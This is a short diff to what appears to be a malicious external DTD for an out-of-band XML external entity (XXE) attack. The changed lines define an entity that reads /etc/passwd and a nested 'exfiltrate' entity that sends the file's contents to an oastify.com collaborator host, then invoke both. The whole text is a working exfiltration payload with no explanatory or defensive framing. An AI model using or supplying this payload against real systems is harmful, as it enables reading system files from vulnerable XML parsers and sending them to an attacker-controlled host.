@@ -1,3 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % stack "<!ENTITY &#x25; xee SYSTEM 'https://h1juifvhza4pznyac7gszphomfs6gz4o.oastify.com/?x=%file;'>">
-
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://vzy8gttvxo23x1woale6x3f2ktqkee23.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
